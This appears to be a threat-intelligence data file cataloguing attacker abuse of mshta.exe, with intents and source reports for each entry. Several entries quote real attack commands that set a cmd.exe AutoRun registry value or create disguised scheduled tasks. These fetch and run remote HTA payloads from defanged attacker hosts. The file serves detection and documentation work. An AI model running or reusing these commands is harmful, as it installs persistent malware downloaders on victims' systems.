associated_commands.intent: Persistence: BabyShark's AutoRun value runs mshta to fetch a remote HTA whenever cmd.exe starts, and scheduled tasks make sure cmd.exe is launched.
associated_commands.source_name: Unit 42 BabyShark February 2019

associated_commands.command: reg add "HKEY_CURRENT_USER\Software\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "powershell.exe start-process -windowstyle hidden -filepath mshta.exe hxxps://bit-albania[.]com/[REDACTED]/Drfwj.hta" /f
associated_commands.intent: Persistence: set cmd.exe's AutoRun so the BabyShark second-stage HTA downloader runs whenever cmd.exe starts.
associated_commands.source_name: Crowdstrike GTR2020 Mar 2020

associated_commands.command: Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c Invoke-Command -ScriptBlock { schtasks /create /TN AutomaticChromeUpdater /TR 'mshta hxxp://hpsj.firewall-gateway.net:8080/MicrosoftUpdate' /SC minute /mo 60} "C:\WINDOWS\system32\schtasks.exe" /create /TN AutomaticChromeUpdater /TR "mshta hxxp://hpsj.firewall-gateway.net:8080/MicrosoftUpdate" /SC minute /mo 60
associated_commands.intent: Koadic persistence: a scheduled task named AutomaticChromeUpdater runs mshta against the attacker's server every 60 minutes.
associated_commands.source_name: Malwarebytes LazyScripter February 2021

associated_commands.intent: Periodic beacon to the attacker's server, run by a VBS file that a scheduled task starts every 20 minutes.
associated_commands.source_name: Qualys LolZarus Lazarus Group February 2022

associated_commands.intent: Execution of Koadic: the intruders used an mshta launcher with JavaScript, and the two executions created child processes that loaded stage 2 into memory.
associated_commands.source_name: The DFIR Report PYSA Mespinoza Ransomware November 2020

associated_commands.intent: Persistence: Koadic scheduled a task that runs a HTA file from C:\ProgramData at logon as SYSTEM, which starts C2 back to the Koadic server.
associated_commands.source_name: The DFIR Report PYSA Mespinoza Ransomware November 2020

associated_commands.command: schtasks /create /sc MINUTE /tn "Windows Error Reporting" /tr "mshta.exe about:'<script language=\"vbscript\" src=\"hxxp://110.10.179(.)65:80/download/microsoftp.jpg\">code close</script>'" /mo 15 /F
associated_commands.intent: Scheduled task created by the spear-phishing macro that runs mshta every 15 minutes to download another payload (a script disguised as a .jpg) from the C&C server.
associated_commands.source_name: Cybereason Operation Cobalt Kitty May 2017

associated_commands.intent: After the user opened the fake invoice document attachment, it ran mshta against a remote HTA that executed a PowerShell script, which downloaded and executed the FormBook information stealer.

associated_commands.intent: Execution of an HTA file hosted on a remote server by abusing mshta.exe via depended.exe.

associated_commands.source_name: Symantec Shuckworm Continues Cyber-Espionage Attacks Against Ukraine January 2022

Microsoft Office Equation Editor memory corruption (remote code execution). In an XWorm phishing campaign, Excel files exploiting it downloaded an HTA file whose JScript runs under mshta.exe.

Microsoft Office Equation Editor memory corruption (remote code execution). Documents exploiting it in the wild commonly ran mshta.exe to execute a remote HTA or script, for example mshta hxxps://zilk[.]pw/url/index.hta.
